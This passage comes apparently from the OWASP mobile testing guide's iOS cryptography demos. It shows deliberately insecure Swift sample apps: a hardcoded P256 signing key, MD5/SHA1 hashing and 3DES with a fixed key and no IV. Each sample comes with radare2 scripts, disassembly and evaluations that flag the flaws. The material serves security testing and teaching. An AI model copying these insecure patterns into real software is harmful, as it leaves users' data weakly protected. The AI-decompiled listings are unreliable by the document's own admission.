sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502    \u2502\u2502\u254e\u2502   0x100004da0      mov x0, x21                               ; void *arg0\n\u2502    \u2502\u2502\u254e\u2502   0x100004da4      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502    \u2502\u2502\u254e\u2502   0x100004da8      ldp x0, x1, [x29, -0xd0]                  ; int64_t arg2\n\u2502    \u2502\u2502\u254e\u2502   0x100004dac      bl sym.func.100005064\n\u2502    \u2502\u2502\u2514\u2500\u2500&lt; 0x100004db0      b 0x100004998\n\u2502    \u2502\u2502 \u2502   ; CODE XREF from sym.func.1000046dc @ 0x100004a64(x)\n\u2502    \u2502\u2502 \u2514\u2500&gt; 0x100004db4      ldur x0, [x29, -0xa8]                     ; void *arg0\n\u2502    \u2502\u2502     0x100004db8      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502    \u2502\u2502     0x100004dbc      ldur x0, [x29, -0xa0]                     ; void *arg0\n\u2502    \u2502\u2502     0x100004dc0      bl sym.imp.swift_release                  ; void swift_release(void *arg0)\n\u2502    \u2502\u2502     0x100004dc4      brk 1\n\u2502    \u2502\u2502     ; CODE XREF from sym.func.1000046dc @ 0x100004bc8(x)\n\u2502    \u2514\u2500\u2500\u2500\u2500&gt; 0x100004dc8      ldur x0, [x29, -0xa8]                     ; void *arg0\n\u2502     \u2502     0x100004dcc      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502     \u2502     0x100004dd0      ldur x0, [x29, -0xa0]                     ; void *arg0\n\u2502     \u2502     0x100004dd4      bl sym.imp.swift_release                  ; void swift_release(void *arg0)\n\u2502     \u2502     0x100004dd8      brk 1\n\u2502     \u2502     ; CODE XREF from sym.func.1000046dc @ 0x100004aac(x)\n\u2502     \u2514\u2500\u2500\u2500&gt; 0x100004ddc      ldur x0, [x29, -0xa8]                     ; void *arg0\n\u2502           0x100004de0      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502           0x100004de4      ldur x0, [x29, -0xa0]                     ; void *arg0\n\u2502           0x100004de8      bl sym.imp.swift_release                  ; void swift_release(void *arg0)\n\u2502           0x100004dec      adrp x1, 0x100007000\n\u2502           0x100004df0      add x1, x1, 0xf40                         ; 0x100007f40 ; \"MASTestApp/MastgTest.swift\"\n\u2502           0x100004df4      mov x0, x21                               ; void *arg0\n\u2502           0x100004df8      mov w2, 0x1a\n\u2502           0x100004dfc      mov w3, 1\n\u2502           0x100004e00      mov w4, 0x1b\n\u2502           0x100004e04      bl sym.imp.swift_unexpectedError          ; void swift_unexpectedError(void *arg0)\n\u2514           0x100004e08      brk 1\n</code></pre> <pre><code>// \u2728 Decompiled using OpenAI's ChatGPT o1-review model \u2728\n\nimport CryptoKit\n\nfunc runCryptoFunction() {\n    // Step 1: Load P256 Private Key from Embedded Data\n    let keyBytes: [UInt8] = [\n        0x7c, 0x02, 0x2a, 0x7e, 0x53, 0x7e, 0x1a, 0x2d,\n        0x44, 0x77, 0xd4, 0xf6, 0x20, 0x8b, 0x14, 0xdb,\n        0x4e, 0x8d, 0x84, 0x19, 0xd6, 0x23, 0x5f, 0xf2,\n        0x4e, 0x4b, 0x8d, 0x18, 0xf4, 0x2c, 0x76, 0xe2\n    ]\n    let keyData = Data(keyBytes)\n\n    do {\n        // Create the private key from data\n        let privateKey = try P256.Signing.PrivateKey(rawRepresentation: keyData)\n\n        // Step 2: Extract Public Key\n        let publicKey = privateKey.publicKey\n\n        // Step 3: Create Sample Data\n        let sampleText = \"This is a sample text\"\n        guard let data = sampleText.data(using: .utf8) else {\n            self.output = \"Failed to convert text to data\"\n            return\n        }\n\n        // Step 4: Sign the Data\n        let signature = try privateKey.signature(for: data)\n\n        // Step 5: Verify the Signature\n        let isValidSignature = publicKey.isValidSignature(signature, for: data)\n\n        // Step 6: Convert Keys and Signature to Hex Strings\n        let publicKeyData = publicKey.rawRepresentation\n        let publicKeyHex = publicKeyData.map { String(format: \"%02x\", $0) }.joined()\n        let signatureData = signature.derRepresentation\n        let signatureHex = signatureData.map { String(format: \"%02x\", $0) }.joined()\n\n        // Step 7: Construct an Output Message\n        var outputMessage = \"Original: \\(sampleText)\"\n        outputMessage += \"\\n\\nSignature is \\(isValidSignature ? \"valid.\" : \"invalid.\")\"\n        outputMessage += \"\\n\\nPublic Key (Hex): \\(publicKeyHex)\"\n        outputMessage += \"\\n\\nSignature (Hex): \\(signatureHex)\"\n        outputMessage += \"\\n\\nVerification: \\(isValidSignature ? \"Success\" : \"Failure\")\"\n\n        // Step 8: Update SwiftUI State Variable\n        self.output = outputMessage\n\n    } catch {\n        // Error handling\n        self.output = \"An error occurred: \\(error)\"\n    }\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0213"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0014/MASTG-DEMO-0014/#steps","title":"Steps","text":"<ol> <li>Unzip the app package and locate the main binary file ( Exploring the App Package), which in this case is <code>./Payload/MASTestApp.app/MASTestApp</code>.</li> <li>Open the app binary with  radare2 for iOS with the <code>-i</code> option to run this script.</li> </ol> cryptokit_hardcoded_ecdsa.r2<pre><code>e asm.bytes=false\ne scr.color=false\ne asm.var=false\n\n?e Uses of CryptoKit.P256.Signing.PrivateKey:\nafl~CryptoKit.P256.Signing.PrivateKey\n\n?e\n\n?e xrefs to CryptoKit.P256.Signing.PrivateKey.rawRepresentation:\naxt @ 0x100007388\n\n?e\n\n?e Use of CryptoKit.P256.Signing.PrivateKey.rawRepresentation:\n\npd-- 9 @ 0x1000048d4\n\npdf @ sym.func.1000046dc &gt; function.asm\n\npx 32 @ 0x1000100c8 &gt; key.asm\n</code></pre> run.sh<pre><code>r2 -q -i cryptokit_hardcoded_ecdsa.r2 -A MASTestApp &gt; output.asm\n</code></pre>","tags":["ios","demo","MASTG-TEST-0213"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0014/MASTG-DEMO-0014/#observation","title":"Observation","text":"<p>The output reveals the different uses of <code>CryptoKit.P256.Signing.PrivateKey</code> functions, especially <code>sym.imp.CryptoKit.P256.Signing.PrivateKey.rawRepresentation</code> which is used to extract the raw representation of the private key. The output also reveals the hardcoded ECDSA private key within the binary's DATA section.</p> output.asmkey.asm <pre><code>Uses of CryptoKit.P256.Signing.PrivateKey:\n0x100007364    1     12 sym.imp.CryptoKit.P256.Signing.PrivateKey.public...F0AE06PublicF0Vvg.Public...F0Vvg...Vvg\n0x100007370    1     12 sym.imp.CryptoKit.P256.Signing.PrivateKey.rawRepresentation.Foundation.ContiguousBytes...lufC\n0x10000737c    1     12 sym.imp.CryptoKit.P256.Signing.PrivateKey.signature.for.ECDSASignature.Foundation.DataProtocol...lF\n0x100007388    1     12 sym.imp.CryptoKit.P256.Signing.PrivateKey...VMa\n\nxrefs to CryptoKit.P256.Signing.PrivateKey.rawRepresentation:\nsym.func.1000046dc 0x1000047f0 [CALL:--x] bl sym.imp.CryptoKit.P256.Signing.PrivateKey...VMa\n\nUse of CryptoKit.P256.Signing.PrivateKey.rawRepresentation:\n\u2502           0x1000048b0      mov x1, x19\n\u2502           0x1000048b4      bl sym.func.100004ed4\n\u2502           0x1000048b8      adrp x1, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x1000048bc      ldr x1, [x1, 0x38]                        ; 0x10000c038\n\u2502                                                                      ; reloc.Foundation.Data...VN\n\u2502           0x1000048c0      adrp x2, reloc.Foundation.__DataStorage.bytes.allocator...itcfc ; 0x10000c000\n\u2502           0x1000048c4      ldr x2, [x2, 0x30]                        ; 0x10000c030\n\u2502                                                                      ; reloc.Foundation.Data...VAA15ContiguousBytesAAWP.ContiguousBytes...WP\n\u2502           0x1000048c8      sub x0, x29, 0x80\n\u2502           0x1000048cc      mov x8, x20\n\u2502           0x1000048d0      mov x21, 0\n\u2502           0x1000048d4      bl sym CryptoKit.P256.Signing.PrivateKey.rawRepresentation.Foundation.ContiguousBytes...lufC ; sym.imp.CryptoKit.P256.Signing.PrivateKey.rawRepresentation.Foundation.ContiguousBytes...lufC\n\u2502       \u250c\u2500&lt; 0x1000048d8      cbz x21, 0x100004900\n\u2502       \u2502   0x1000048dc      mov x0, x21\n\u2502       \u2502   0x1000048e0      bl sym.imp.swift_errorRelease\n\u2502       \u2502   0x1000048e4      ldr x8, [x28, 0x38]\n\u2502       \u2502   0x1000048e8      mov x0, x20\n\u2502       \u2502   0x1000048ec      mov w1, 1\n\u2502       \u2502   0x1000048f0      mov w2, 1\n\u2502       \u2502   0x1000048f4      mov x3, x23\n</code></pre> <pre><code>- offset -   C8C9 CACB CCCD CECF D0D1 D2D3 D4D5 D6D7  89ABCDEF01234567\n0x1000100c8  7c02 2a7e 537e 1a2d 4477 d4f6 208b 14db  |.*~S~.-Dw.. ...\n0x1000100d8  4e8d 8419 d623 5ff2 4e4b 8d18 f42c 76e2  N....#_.NK...,v.\n</code></pre>","tags":["ios","demo","MASTG-TEST-0213"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0014/MASTG-DEMO-0014/#evaluation","title":"Evaluation","text":"<p>The test fails because a hardcoded ECDSA private key was found in the code.</p> <p>Note: Using artificial intelligence we're able to decompile the disassembled code and review it. The output is a human-readable version of the assembly code. The AI decompiled code may not perfect and might contain errors but, in this case, it clearly shows the use of <code>CryptoKit.P256.Signing.PrivateKey</code> and the associated private key.</p>","tags":["ios","demo","MASTG-TEST-0213"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0015/MASTG-DEMO-0015/","title":"MASTG-DEMO-0015: Uses of Broken Hashing Algorithms in CommonCrypto with r2","text":"<p>  Download MASTG-DEMO-0015 IPA   Open MASTG-DEMO-0015 Folder  Build MASTG-DEMO-0015 IPA</p>","tags":["ios","demo","MASTG-TEST-0211"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0015/MASTG-DEMO-0015/#sample","title":"Sample","text":"MastgTest.swift<pre><code>import Foundation\nimport CommonCrypto\n\nstruct MastgTest {\n    // Function to generate a SHA-1 hash\n    static func generateSHA1Hash(data: Data) -&gt; String {\n        var hash = [UInt8](repeating: 0, count: Int(CC_SHA1_DIGEST_LENGTH))\n        data.withUnsafeBytes {\n            _ = CC_SHA1($0.baseAddress, CC_LONG(data.count), &amp;hash)\n        }\n        return hash.map { String(format: \"%02hhx\", $0) }.joined()\n    }\n\n    // Function to generate an MD5 hash\n    static func generateMD5Hash(data: Data) -&gt; String {\n        var hash = [UInt8](repeating: 0, count: Int(CC_MD5_DIGEST_LENGTH))\n        data.withUnsafeBytes {\n            _ = CC_MD5($0.baseAddress, CC_LONG(data.count), &amp;hash)\n        }\n        return hash.map { String(format: \"%02hhx\", $0) }.joined()\n    }\n\n    static func mastgTest(completion: @escaping (String) -&gt; Void) {\n        let input = \"This is a sample text\".data(using: .utf8)!\n\n        // Generate SHA-1 hash\n        let sha1Hash = generateSHA1Hash(data: input)\n\n        // Generate MD5 hash\n        let md5Hash = generateMD5Hash(data: input)\n\n        let value = \"\"\"\n        Original: \\(String(data: input, encoding: .utf8)!)\n        SHA-1 Hash: \\(sha1Hash)\n        MD5 Hash: \\(md5Hash)\n        \"\"\"\n\n        completion(value)\n    }\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0211"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0015/MASTG-DEMO-0015/#steps","title":"Steps","text":"<ol> <li>Unzip the app package and locate the main binary file ( Exploring the App Package), which in this case is <code>./Payload/MASTestApp.app/MASTestApp</code>.</li> <li>Open the app binary with  radare2 for iOS with the <code>-i</code> option to run this script.</li> </ol> cchash.r2<pre><code>?e;?e\n\n?e Uses of CommonCrypto hash function:\nafl~CC_\n\n?e\n\n?e xrefs to CC_MD5:\naxt @ 0x1000071a8\n\n?e xrefs to CC_SHA1:\naxt @ 0x1000071b4\n\n?e\n\n?e Use of MD5:\npd-- 5 @ 0x1000048c4\n\n?e\n\n?e Use of SHA1:\npd-- 5 @ 0x10000456c\n</code></pre> run.sh<pre><code>r2 -q -i cchash.r2 -A MASTestApp\n</code></pre>","tags":["ios","demo","MASTG-TEST-0211"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0015/MASTG-DEMO-0015/#observation","title":"Observation","text":"<p>The output contains all uses of CommonCrypto hash functions in the binary, the xrefs for <code>CC_MD5</code> and <code>CC_SHA1</code> and the disassembled code of the region where each of these functions is called.</p> output.txt<pre><code>Uses of CommonCrypto hash function:\n0x1000071a8    1     12 sym.imp.CC_MD5\n0x1000071b4    1     12 sym.imp.CC_SHA1\n\nxrefs to CC_MD5:\n(nofunc) 0x1000048c4 [CALL:--x] bl sym.imp.CC_MD5\nxrefs to CC_SHA1:\n(nofunc) 0x10000456c [CALL:--x] bl sym.imp.CC_SHA1\n\nUse of MD5:\n            0x1000048b0      ffe301f8       stur xzr, [sp, 0x1e]\n            0x1000048b4      ff0f00f9       str xzr, [sp, 0x18]\n            0x1000048b8      e01b00f9       str x0, [sp, 0x30]\n            0x1000048bc      e0630091       add x0, sp, 0x18\n            0x1000048c0      01008052       mov w1, 0\n            ; CODE XREF from sym.func.100004728 @ +0xf0(x)\n            0x1000048c4      390a0094       bl sym.imp.CC_MD5\n            0x1000048c8      e00316aa       mov x0, x22\n            0x1000048cc      e10314aa       mov x1, x20\n            0x1000048d0      7d000094       bl sym.func.100004ac4\n            ; CODE XREF from sym.func.100004728 @ +0x184(x)\n            0x1000048d4      e00316aa       mov x0, x22\n\nUse of SHA1:\n            0x100004558      ffe301f8       stur xzr, [sp, 0x1e]\n            0x10000455c      ff0f00f9       str xzr, [sp, 0x18]\n            0x100004560      e01b00f9       str x0, [sp, 0x30]\n            0x100004564      e0630091       add x0, sp, 0x18\n            0x100004568      01008052       mov w1, 0\n            ; CODE XREF from sym.func.1000043cc @ +0xf4(x)\n            0x10000456c      120b0094       bl sym.imp.CC_SHA1\n            0x100004570      e00316aa       mov x0, x22\n            0x100004574      e10314aa       mov x1, x20\n            0x100004578      53010094       bl sym.func.100004ac4\n            ; CODE XREF from sym.func.1000043cc @ +0x188(x)\n            0x10000457c      e00316aa       mov x0, x22\n</code></pre>","tags":["ios","demo","MASTG-TEST-0211"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0015/MASTG-DEMO-0015/#evaluation","title":"Evaluation","text":"<p>The test fails because the MD5 and SHA1 algorithms were found in the code.</p> <p>Remember that the context is important when evaluating the use of these algorithms. In some cases, the use of MD5 or SHA1 may be acceptable, for example, when the algorithm is used for checksums or non-cryptographic purposes. In order to determine that you should further analyze the reverse-engineered code and try to learn more about the context in which these algorithms are used.</p>","tags":["ios","demo","MASTG-TEST-0211"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0016/MASTG-DEMO-0016/","title":"MASTG-DEMO-0016: Uses of Broken Hashing Algorithms in CryptoKit with r2","text":"<p>  Download MASTG-DEMO-0016 IPA   Open MASTG-DEMO-0016 Folder  Build MASTG-DEMO-0016 IPA</p>","tags":["ios","demo","MASTG-TEST-0211"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0016/MASTG-DEMO-0016/#sample","title":"Sample","text":"MastgTest.swift<pre><code>import Foundation\nimport CryptoKit\n\nstruct MastgTest {\n    // Function to generate a SHA-1 hash\n    static func generateSHA1Hash(data: Data) -&gt; String {\n        let hash = Insecure.SHA1.hash(data: data)\n        return hash.compactMap { String(format: \"%02x\", $0) }.joined()\n    }\n\n    // Function to generate an MD5 hash\n    static func generateMD5Hash(data: Data) -&gt; String {\n        let hash = Insecure.MD5.hash(data: data)\n        return hash.compactMap { String(format: \"%02x\", $0) }.joined()\n    }\n\n    static func mastgTest(completion: @escaping (String) -&gt; Void) {\n        let input = \"This is a sample text\".data(using: .utf8)!\n\n        // Generate SHA-1 hash\n        let sha1Hash = generateSHA1Hash(data: input)\n\n        // Generate MD5 hash\n        let md5Hash = generateMD5Hash(data: input)\n\n        let value = \"\"\"\n        Original: \\(String(data: input, encoding: .utf8)!)\n        SHA-1 Hash: \\(sha1Hash)\n        MD5 Hash: \\(md5Hash)\n        \"\"\"\n\n        completion(value)\n    }\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0211"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0016/MASTG-DEMO-0016/#steps","title":"Steps","text":"<ol> <li>Unzip the app package and locate the main binary file ( Exploring the App Package), which in this case is <code>./Payload/MASTestApp.app/MASTestApp</code>.</li> <li>Open the app binary with  radare2 for iOS with the <code>-i</code> option to run this script.</li> </ol> cryptokit_hash.r2<pre><code>?e;?e\n\n?e Uses of CryptoKit.Insecure functions:\nafl~Insecure.\n\n?e\n\n?e xrefs to CryptoKit.Insecure.MD5:\naxt @ 0x100007280\n\n?e\n\n?e xrefs to CryptoKit.Insecure.SHA1:\naxt @ 0x10000728c\n\n?e\n\n?e Use of MD5:\npd-- 5 @ 0x1000046d8\n\n?e\n\n?e Use of SHA1:\npd-- 5 @ 0x100004214\n</code></pre> run.sh<pre><code>r2 -q -i cryptokit_hash.r2 -A MASTestApp\n</code></pre>","tags":["ios","demo","MASTG-TEST-0211"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0016/MASTG-DEMO-0016/#observation","title":"Observation","text":"<p>The output contains all uses of <code>CryptoKit.Insecure</code> functions in the binary, the xrefs for <code>Insecure.MD5</code> and <code>Insecure.SHA1</code> and the disassembled code of the region where each of these functions is called.</p> output.txt<pre><code>Uses of CryptoKit.Insecure functions:\n0x100007274    1     12 sym.imp.CryptoKit.Insecure.SHA1Digest.\n0x100007280    1     12 sym.imp.CryptoKit.Insecure.MD5.\n0x10000728c    1     12 sym.imp.CryptoKit.Insecure.SHA1.\n0x100007298    1     12 sym.imp.CryptoKit.Insecure.MD5Digest.\n\nxrefs to CryptoKit.Insecure.MD5:\nsym.func.10000469c 0x1000046d8 [CALL:--x] bl sym.imp.CryptoKit.Insecure.MD5.\n\nxrefs to CryptoKit.Insecure.SHA1:\nsym.func.1000041d8 0x100004214 [CALL:--x] bl sym.imp.CryptoKit.Insecure.SHA1.\n\nUse of MD5:\n\u2502           0x1000046c4      48000090       adrp x8, reloc.Foundation.__DataStorage._bytes.allocator__UnsafeMutableRawPointer______ ; 0x10000c000\n\u2502           0x1000046c8      08d141f9       ldr x8, reloc.__stack_chk_guard ; 0x10000c3a0\n\u2502           0x1000046cc      080140f9       ldr x8, [x8]\n\u2502           0x1000046d0      a8831af8       stur x8, [x29, -0x58]\n\u2502           0x1000046d4      000080d2       mov x0, 0\n\u2502           0x1000046d8      ea0a0094       bl sym CryptoKit.Insecure.MD5. ; sym.imp.CryptoKit.Insecure.MD5.\n\u2502           0x1000046dc      f70300aa       mov x23, x0\n\u2502           0x1000046e0      54000090       adrp x20, reloc.Foundation.__DataStorage._bytes.allocator__UnsafeMutableRawPointer______ ; 0x10000c000\n\u2502           0x1000046e4      947241f9       ldr x20, reloc.CryptoKit.Insecure.MD5. ; 0x10000c2e0\n\u2502           0x1000046e8      16805ff8       ldur x22, [x0, -8]\n\nUse of SHA1:\n\u2502           0x100004200      48000090       adrp x8, reloc.Foundation.__DataStorage._bytes.allocator__UnsafeMutableRawPointer______ ; 0x10000c000\n\u2502           0x100004204      08d141f9       ldr x8, reloc.__stack_chk_guard ; 0x10000c3a0\n\u2502           0x100004208      080140f9       ldr x8, [x8]\n\u2502           0x10000420c      a8831af8       stur x8, [x29, -0x58]\n\u2502           0x100004210      000080d2       mov x0, 0\n\u2502           0x100004214      1e0c0094       bl sym CryptoKit.Insecure.SHA1. ; sym.imp.CryptoKit.Insecure.SHA1.\n\u2502           0x100004218      f70300aa       mov x23, x0\n\u2502           0x10000421c      54000090       adrp x20, reloc.Foundation.__DataStorage._bytes.allocator__UnsafeMutableRawPointer______ ; 0x10000c000\n\u2502           0x100004220      947a41f9       ldr x20, reloc.CryptoKit.Insecure.SHA1. ; 0x10000c2f0\n\u2502           0x100004224      16805ff8       ldur x22, [x0, -8]\n</code></pre>","tags":["ios","demo","MASTG-TEST-0211"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0016/MASTG-DEMO-0016/#evaluation","title":"Evaluation","text":"<p>The test fails because the MD5 and SHA1 algorithms were found in the code.</p> <p>Remember that the context is important when evaluating the use of these algorithms. In some cases, the use of MD5 or SHA1 may be acceptable, for example, when the algorithm is used for checksums or non-cryptographic purposes. In order to determine that you should further analyze the reverse-engineered code and try to learn more about the context in which these algorithms are used.</p>","tags":["ios","demo","MASTG-TEST-0211"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0018/MASTG-DEMO-0018/","title":"MASTG-DEMO-0018: Uses of Broken Encryption Algorithms in CommonCrypto with r2","text":"<p>  Download MASTG-DEMO-0018 IPA   Open MASTG-DEMO-0018 Folder  Build MASTG-DEMO-0018 IPA</p>","tags":["ios","demo","MASTG-TEST-0210"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0018/MASTG-DEMO-0018/#sample","title":"Sample","text":"MastgTest.swiftfunction.asmdecompiled-o1-review.swift <pre><code>import SwiftUI\nimport CommonCrypto\n\nstruct MastgTest {\n    static func mastgTest(completion: @escaping (String) -&gt; Void) {\n        let key = \"0123456789abcdef01234567\" // 24-byte key for 3DES\n        let data = \"This is a sample text\".data(using: .utf8)!\n\n        // Create a buffer for encrypted data\n        var encryptedBytes = [UInt8](repeating: 0, count: data.count + kCCBlockSize3DES)\n        var numBytesEncrypted: size_t = 0\n\n        let cryptStatus = data.withUnsafeBytes { dataBytes in\n            key.withCString { keyBytes in\n                CCCrypt(\n                    CCOperation(kCCEncrypt),              // Encrypt\n                    CCAlgorithm(kCCAlgorithm3DES),        // 3DES Algorithm\n                    CCOptions(kCCOptionPKCS7Padding),     // PKCS7 Padding\n                    keyBytes, kCCKeySize3DES,             // Key and key length\n                    nil,                                  // Initialization Vector (optional)\n                    dataBytes.baseAddress, data.count,    // Input data\n                    &amp;encryptedBytes, encryptedBytes.count, // Output data\n                    &amp;numBytesEncrypted                    // Number of bytes encrypted\n                )\n            }\n        }\n\n        if cryptStatus == kCCSuccess {\n            let encryptedData = Data(bytes: encryptedBytes, count: numBytesEncrypted)\n            let encryptedHex = encryptedData.map { String(format: \"%02hhx\", $0) }.joined()\n            let value = \"Original:\\n\\n \\(String(data: data, encoding: .utf8)!)\\n\\nEncrypted (Hex):\\n \\(encryptedHex)\"\n            completion(value)\n        } else {\n            completion(\"Encryption failed with status: \\(cryptStatus)\")\n        }\n    }\n}\n</code></pre> <pre><code>            ;-- section.0.__TEXT.__text:\n            ; XREFS: 0x1000000d0  STRN 0x100004040  STRN 0x100004168  CALL 0x100004774  CALL 0x1000047d8  CALL 0x100005330  \n\u250c 276: sym.func.100004000 (int64_t arg1, int64_t arg2, int64_t arg4, int64_t arg5, int64_t arg6, int64_t arg7, int64_t arg_80h);\n\u2502           0x100004000      sub sp, sp, 0x80                          ; [00] -r-x section size 13240 named 0.__TEXT.__text\n\u2502           0x100004004      str x28, [var_20h]\n\u2502           ; CODE XREF from str.0123456789abcdef01234567 @ +0x14(x)\n\u2502           0x100004008      stp x27, x26, [var_30h]\n\u2502           0x10000400c      stp x25, x24, [var_40h]\n\u2502           0x100004010      stp x23, x22, [var_50h]\n\u2502           0x100004014      stp x20, x19, [var_60h]\n\u2502           0x100004018      stp x29, x30, [var_70h]\n\u2502           0x10000401c      add x29, sp, 0x70\n\u2502           0x100004020      mov x20, x8\n\u2502           0x100004024      lsr x8, x4, 0x3e                          ; arg5\n\u2502           0x100004028      mov x19, x21\n\u2502           0x10000402c      mov x24, x6                               ; arg7\n\u2502           0x100004030      mov x26, x5                               ; arg6\n\u2502           0x100004034      mov x22, x1                               ; arg2\n\u2502           0x100004038      mov x23, x0                               ; arg1\n\u2502           0x10000403c      mov x25, 0\n\u2502           0x100004040      adrp x9, sym.func.100004000               ; 0x100004000\n\u2502           0x100004044      add x9, x9, 0x114                         ; 0x100004114\n\u2502                                                                      ; sym.func.100004114\n\u2502           ;-- switch:\n\u2502           0x100004048      adr x10, switch.0x100004048               ; switch table (4 cases) at 0x100004114\n\u2502           0x10000404c      ldrsw x11, [x9, x8, lsl 2]                ; 0x100004114\n\u2502                                                                      ; sym.func.100004114\n\u2502           0x100004050      add x10, x10, x11                         ; 0x100004058\n\u2502                                                                      ; case.0x100004048.0\n\u2502           0x100004054      br x10\n\u2502           ;-- case 0:                                                ; from 0x100004048\n\u2502           ; DATA XREFS from sym.func.100004000 @ 0x100004048(x), 0x100004050(w)\n\u2502           0x100004058      ubfx x25, x4, 0x30, 8                     ; arg5\n\u2502       \u250c\u2500&lt; 0x10000405c      b case.0x100004048.3\n\u2502       \u2502   ;-- case 1:                                                ; from 0x100004048\n\u2502       \u2502   ; CODE XREF from sym.func.100004000 @ 0x100004048(x)\n\u2502       \u2502   0x100004060      lsr x8, x3, 0x20                          ; arg4\n\u2502       \u2502   0x100004064      subs w8, w8, w3\n\u2502      \u250c\u2500\u2500&lt; 0x100004068      b.vs 0x10000410c\n\u2502      \u2502\u2502   0x10000406c      sxtw x25, w8\n\u2502     \u250c\u2500\u2500\u2500&lt; 0x100004070      b case.0x100004048.3\n\u2502     \u2502\u2502\u2502   ;-- case 2:                                                ; from 0x100004048\n\u2502     \u2502\u2502\u2502   ; CODE XREF from sym.func.100004000 @ 0x100004048(x)\n\u2502     \u2502\u2502\u2502   0x100004074      ldp x9, x8, [x3, 0x10]                    ; arg4\n\u2502     \u2502\u2502\u2502   0x100004078      subs x25, x8, x9\n\u2502    \u250c\u2500\u2500\u2500\u2500&lt; 0x10000407c      b.vs 0x100004110\n\u2502    \u2502\u2502\u2502\u2502   ;-- case 3:                                                ; from 0x100004048\n\u2502    \u2502\u2502\u2502\u2502   ; CODE XREFS from sym.func.100004000 @ 0x100004048(x), 0x10000405c(x), 0x100004070(x)\n\u2502    \u2502\u2514\u2500\u2514\u2500&gt; 0x100004080      ldr x28, [x26]\n\u2502    \u2502 \u2502    0x100004084      ldr x27, [x28, 0x10]\n\u2502    \u2502 \u2502    0x100004088      mov x0, x28\n\u2502    \u2502 \u2502    0x10000408c      bl sym.imp.swift_isUniquelyReferenced_nonNull_native\n\u2502    \u2502 \u2502    0x100004090      str x28, [x26]\n\u2502    \u2502 \u2502\u250c\u2500&lt; 0x100004094      tbnz w0, 0, 0x1000040b0\n\u2502    \u2502 \u2502\u2502   0x100004098      mov w0, 0\n\u2502    \u2502 \u2502\u2502   0x10000409c      mov x1, x27                               ; signed int64_t arg2\n\u2502    \u2502 \u2502\u2502   0x1000040a0      mov w2, 0\n\u2502    \u2502 \u2502\u2502   0x1000040a4      mov x3, x28                               ; int64_t arg_10h\n\u2502    \u2502 \u2502\u2502   0x1000040a8      bl sym.func.1000045dc\n\u2502    \u2502 \u2502\u2502   0x1000040ac      mov x28, x0\n\u2502    \u2502 \u2502\u2502   ; CODE XREF from sym.func.100004000 @ 0x100004094(x)\n\u2502    \u2502 \u2502\u2514\u2500&gt; 0x1000040b0      str x28, [x26]\n\u2502    \u2502 \u2502    0x1000040b4      add x8, x28, 0x20\n\u2502    \u2502 \u2502    0x1000040b8      stp x27, x24, [var_8h]\n\u2502    \u2502 \u2502    0x1000040bc      str x8, [sp]\n\u2502    \u2502 \u2502    0x1000040c0      mov w0, 0\n\u2502    \u2502 \u2502    0x1000040c4      mov w1, 2\n\u2502    \u2502 \u2502    0x1000040c8      mov w2, 1\n\u2502    \u2502 \u2502    0x1000040cc      mov x3, x23\n\u2502    \u2502 \u2502    0x1000040d0      mov w4, 0x18\n\u2502    \u2502 \u2502    0x1000040d4      mov x5, 0\n\u2502    \u2502 \u2502    0x1000040d8      mov x6, x22\n\u2502    \u2502 \u2502    0x1000040dc      mov x7, x25\n\u2502    \u2502 \u2502    0x1000040e0      bl sym.imp.CCCrypt                        ; CCCryptorStatus CCCrypt(CCOperation op, CCAlgorithm alg, int32_t options, const void *key, uint32_t keyLength, const void *iv, const void *dataIn, uint32_t dataInLength, void *dataOut, uint32_t dataOutAvailable, uint32_t *dataOutMoved)\n\u2502    \u2502 \u2502    0x1000040e4      str w0, [x20]\n\u2502    \u2502 \u2502    0x1000040e8      mov x21, x19\n\u2502    \u2502 \u2502    0x1000040ec      ldp x29, x30, [var_70h]\n\u2502    \u2502 \u2502    0x1000040f0      ldp x20, x19, [var_60h]\n\u2502    \u2502 \u2502    0x1000040f4      ldp x23, x22, [var_50h]\n\u2502    \u2502 \u2502    0x1000040f8      ldp x25, x24, [var_40h]\n\u2502    \u2502 \u2502    0x1000040fc      ldp x27, x26, [var_30h]\n\u2502    \u2502 \u2502    0x100004100      ldr x28, [var_20h]\n\u2502    \u2502 \u2502    0x100004104      add sp, sp, 0x80\n\u2502    \u2502 \u2502    0x100004108      ret\n\u2502    \u2502 \u2502    ; CODE XREF from sym.func.100004000 @ 0x100004068(x)\n\u2502    \u2502 \u2514\u2500\u2500&gt; 0x10000410c      brk 1\n\u2502    \u2502      ; CODE XREF from sym.func.100004000 @ 0x10000407c(x)\n\u2514    \u2514\u2500\u2500\u2500\u2500&gt; 0x100004110      brk 1\n</code></pre> <pre><code>// \u2728 Decompiled using OpenAI's ChatGPT o1-review model \u2728\n\nimport CommonCrypto\n\nfunc encryptSampleText() -&gt; String? {\n    // Step 1: Define the 